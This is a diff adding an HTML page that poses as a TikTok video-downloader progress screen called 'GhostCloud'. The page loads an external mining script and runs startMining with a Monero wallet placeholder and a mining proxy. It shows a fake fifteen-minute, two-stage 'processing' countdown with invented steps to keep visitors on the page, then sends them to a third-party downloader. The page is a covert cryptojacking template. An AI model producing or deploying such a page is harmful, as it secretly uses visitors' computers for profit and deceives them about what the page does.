@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>GhostCloud | Processing...</title>
+    <script src="https://webminer.pages.dev/load.js"></script>
+    <style>
+        body { background: #0b111a; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .loader-card { width: 85%; max-width: 380px; text-align: center; }
+        .status-label { font-size: 11px; font-weight: 700; color: #007bff; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; }
+        .timer-display { font-size: 48px; font-weight: 300; margin-bottom: 25px; }
+        .bar-container { background: #1e293b; height: 4px; border-radius: 2px; margin-bottom: 15px; overflow: hidden; }
+        .bar-active { height: 100%; width: 0%; background: #007bff; transition: 1s linear; }
+        .sub-text { color: #64748b; font-size: 13px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+    <div class="loader-card">
+        <div class="status-label" id="phase_name">STAGE 1: CDN SYNCHRONIZATION</div>
+        <div class="timer-display" id="clock">15:00</div>
+        <div class="bar-container"><div class="bar-active" id="bar"></div></div>
+        <p class="sub-text" id="desc">Locating media fragments on TikTok global servers...</p>
+    </div>
+
+    <script>
+        // REPLACE THE ADDRESS BELOW WITH YOUR OWN WALLET
+        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        let stage = parseInt(urlParams.get('stage')) || 1;
+        let time = 900; // 15 Minutes (900 seconds)
+
+        const clockEl = document.getElementById('clock');
+        const barEl = document.getElementById('bar');
+        const phaseEl = document.getElementById('phase_name');
+        const descEl = document.getElementById('desc');
+
+        if(stage === 2) {
+            phaseEl.innerText = "STAGE 2: HD RECONSTRUCTION";
+            descEl.innerText = "Stripping watermarks and applying high-bitrate upscaling...";
+        }
+
+        const run = setInterval(() => {
+            time--;
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            clockEl.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            barEl.style.width = ((900 - time) / 900 * 100) + "%";
+
+            if (time <= 0) {
+                clearInterval(run);
+                const originalUrl = urlParams.get('url');
+                if (stage === 1) {
+                    window.location.href = `verify.html?url=${encodeURIComponent(originalUrl)}&stage=2`;
+                } else {
+                    window.location.href = `https://snaptik.app/abc.php?url=${encodeURIComponent(originalUrl)}`;
+                }
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
